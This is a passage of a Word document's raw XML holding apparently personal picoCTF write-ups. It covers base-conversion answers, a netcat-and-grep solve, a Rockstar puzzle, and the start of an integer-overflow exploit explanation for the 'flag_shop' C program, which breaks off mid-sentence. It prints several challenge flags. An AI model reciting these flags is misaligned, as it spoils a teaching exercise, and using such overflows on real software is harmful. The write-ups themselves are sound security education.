      <w:r>
        <w:t>Please give the 01101100 01101001 01101101 01100101 as a word.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="481E33B2" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>...</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49B20A22" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>you have 45 seconds.....</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E3B855B" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5C77C714" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Input:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A1D2DFE" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>lime</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C7A6069" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Please give me the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t xml:space="preserve"> 163 164 162 145 145 164</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> as a word.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DD16ECB" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>Input:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="369422A3" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>street</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C01863A" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>Please give me the 636f6d7075746572 as a word.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1187560F" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>Input:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FFD4203" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>computer</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01DA284A" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>You've beaten the challenge</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29483F07" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>Flag: picoCTF{learning_about_converting_values_00a975ff}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53A6C676" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="40188252" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>octal  :</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>163 164 162 145 145 164</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="074C5B62" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>plumbing</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="175A7F0B" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:spacing w:after="0"/>
      </w:pPr>
      <w:r>
        <w:t>| 200 points</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05C88491" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>Tags: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="789271A9" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>Author: Alex Fulton/Danny Tunitis</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="251F4912" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Description</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C4307F0" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Sometimes you need to handle process data outside of a file. Can you find a way to keep the output from this program and search for the flag? Connect to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>jupiter.challenges.picoctf.org 7480</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72945834" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>$ nc jupiter.challenges.picoctf.org 7480 &gt;result</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4008B0D0" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>caro@ubuntu:~/Downloads$ cat result | grep 'pico'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2873E106" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>picoCTF{digital_plumb3r_06e9d954}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="008C6545" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2515C37D" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>caro@ubuntu:~/Downloads$ nc jupiter.challenges.picoctf.org 7480 |</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>grep 'pico'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EF94776" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>picoCTF{digital_plumb3r_06e9d954}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C374FEC" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>mus1c</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0101EF00" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:spacing w:after="0"/>
      </w:pPr>
      <w:r>
        <w:t>| 300 points</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="423A7372" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>Tags: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="576BA8D7" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>Author: Danny</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58392FE6" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Description</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24EF64B2" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">I wrote you a </w:t>
      </w:r>
      <w:hyperlink r:id="rId31" w:tgtFrame="_blank">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="InternetLink"/>
          </w:rPr>
          <w:t>song</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t>. Put it in the picoCTF{} flag format.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EF6C7D9" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>Hint: Are you good at rockstar</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C5D98BD" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>Google  rockstar</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DB95A63" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:hyperlink>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="InternetLink"/>
          </w:rPr>
          <w:t>https://codewithrockstar.com/online</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="6ACD45A1" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5FF51E22" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="0" distR="0" simplePos="0" relativeHeight="3" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="77B78C16" wp14:editId="57862785">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="column">
              <wp:posOffset>37465</wp:posOffset>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>452755</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="5000625" cy="45339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2"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5000625" cy="4533900"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:anchor>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="5991E6E0" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4D530820" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="056B8AEC" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="09BD244E" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>picoCTF{rrrocknrn0113r}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38266A07" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>convert ascii to characters</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34BE5008" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>flag_shop</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0411134F" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:spacing w:after="0"/>
      </w:pPr>
      <w:r>
        <w:t>| 300 points</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E1E6D5B" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>Tags: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1056039E" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>Author: Danny</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4ED589C8" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Description</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71139F23" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">There's a flag shop selling stuff, can you buy a flag? </w:t>
      </w:r>
      <w:hyperlink r:id="rId33" w:tgtFrame="_blank">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="InternetLink"/>
          </w:rPr>
          <w:t>Source</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve">. Connect with </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>nc jupiter.challenges.picoctf.org 4906</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18CCE79F" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="07DE7371" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7BFF5DC2" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Solve</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EBCE606" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>Open up the source, and we see that the service is a simple store. It offers us 3 options, but the one we're interested in is the second one.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FD1221B" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The second one offers fake flags and the real flag. Of course, the real flag costs </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>100000</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> dollars, and we only start with </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>1100</w:t>
      </w:r>
      <w:r>
        <w:t>. So how in the world do we get more money? Let's look at the fake flags.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15167347" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>if(auction_choice == 1){</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19511BE0" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">    printf("These knockoff Flags cost 900 each, enter desired quantity\n");</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57A712E0" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">    int number_flags = 0;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F8C058C" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">    fflush(stdin);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79BDB475" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">    scanf("%d", &amp;number_flags);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DC0DC38" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">    if(number_flags &gt; 0){</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6ACD49F3" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">        int total_cost = 0;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="609AE7FC" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">        total_cost = 900*number_flags;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31C2A05D" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">        printf("\nThe final cost is: %d\n", total_cost);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="128EE641" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">        if(total_cost &lt;= account_balance){</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F24169F" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">            account_balance = account_balance - total_cost;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76847E6A" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">            printf("\nYour current balance after transaction: %d\n\n", account_balance);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53F2B29A" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">        }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20BA8ECC" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">        else{</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3004DB36" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">            printf("Not enough funds to complete purchase\n");</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="455A7BD0" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">        }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B4CA232" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">    }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05F72485" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
        <w:spacing w:after="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7540B950" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">We see that every fake flag costs </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>900</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> dollars and it subtracts the total cost from our account balance. But what if </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>total_cost</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is negative? Then we add </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>total_cost</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to our balance, and if </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>total_cost</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is negative enough, then we can get a huge account balance. How do we get a negative </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>total_cost</w:t>
      </w:r>
      <w:r>
        <w:t>?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F121857" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Notice that </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>total_cost</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is declared as an </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>int</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. This is specifically a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Emphasis"/>
        </w:rPr>
        <w:t>Signed Integer</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, which has a range between </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>-2,147,483,648</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>2,147,483,647</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. Signed integers use the first bit to store whether it is negative or positive, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>0</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> indicating positive and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> indicating negative. What happens if you add </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>2,147,483,647</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and store the result in a signed integer? Well the first bit goes from </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>0</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, meaning that the number is now negative! In fact, due to the way </w:t>
      </w:r>
      <w:hyperlink r:id="rId34">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="InternetLink"/>
          </w:rPr>
          <w:t>Two's Complement</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve">, the method used to represent negative numbers in binary, works, it actually wraps around to the most negative integer: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>-2,147,483,648</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="043C9933" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">This is what is known as an </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>Integer Overflow</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. We can use this to overflow the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>total_cost</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> variable and increase our account balance. We need a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>total_cost</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> that is a large negative number, but not too large that it also overflows our </w:t>
      </w:r>
